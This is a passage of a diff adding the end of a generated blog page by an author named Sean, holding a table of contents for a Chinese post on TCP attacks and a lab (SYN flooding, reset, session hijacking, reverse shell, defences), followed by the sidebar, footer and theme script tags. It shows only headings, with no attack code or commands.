+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%90%86%E8%AE%BA"><span class="nav-number">1.</span> <span class="nav-text">理论</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#TCP%E9%80%9A%E4%BF%A1%E4%BB%A3%E7%A0%81"><span class="nav-number">1.1.</span> <span class="nav-text">TCP通信代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TCP%E6%8A%A5%E6%96%87"><span class="nav-number">1.2.</span> <span class="nav-text">TCP报文</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B"><span class="nav-number">1.3.</span> <span class="nav-text">TCP三次握手</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SYN-Flooding"><span class="nav-number">1.4.</span> <span class="nav-text">SYN Flooding</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TCP%E9%87%8D%E7%BD%AE%E6%94%BB%E5%87%BB"><span class="nav-number">1.5.</span> <span class="nav-text">TCP重置攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TCP%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81%E6%94%BB%E5%87%BB"><span class="nav-number">1.6.</span> <span class="nav-text">TCP会话劫持攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%90%91shell"><span class="nav-number">1.6.1.</span> <span class="nav-text">反向shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1"><span class="nav-number">1.6.2.</span> <span class="nav-text">防御</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C"><span class="nav-number">2.</span> <span class="nav-text">实验</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Task1-SYN"><span class="nav-number">2.1.</span> <span class="nav-text">Task1 SYN</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-synflooding-py"><span class="nav-number">2.1.1.</span> <span class="nav-text">1.1 synflooding.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-synflooding-c"><span class="nav-number">2.1.2.</span> <span class="nav-text">1.2 synflooding.c</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-syncookie"><span class="nav-number">2.1.3.</span> <span class="nav-text">1.3  syncookie</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task2-RST"><span class="nav-number">2.2.</span> <span class="nav-text">Task2 RST</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task3-session-py"><span class="nav-number">2.3.</span> <span class="nav-text">Task3  session.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task4"><span class="nav-number">2.4.</span> <span class="nav-text">Task4</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Sean"
+      src="/images/banner.jpg">
+  <p class="site-author-name" itemprop="name">Sean</p>
+  <div class="site-description" itemprop="description">热爱可抵岁月漫长</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">90</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Seanxz401" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Seanxz401" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sean</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
